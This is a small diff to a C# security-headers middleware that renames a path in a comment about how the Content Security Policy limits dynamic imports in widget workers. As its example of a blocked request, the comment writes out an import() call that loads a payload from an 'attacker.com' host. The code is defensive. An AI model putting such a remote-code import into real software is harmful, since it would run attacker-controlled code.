@@ -14,7 +14,7 @@ internal static class SecurityHeadersMiddleware
     // Module workers inherit their creator document's CSP, so a policy here
     // also gates `import()` calls inside Tier 2 widget workers — blocking
     // `import("https://attacker.com/payload.js")` while still allowing
-    // same-origin sibling imports under /widgets-api/code/...
+    // same-origin sibling imports under /apps-api/code/...
     //
     // 'unsafe-inline' on script-src/style-src is required for the SPA's
     // bootstrap script + React inline styles. It doesn't widen the
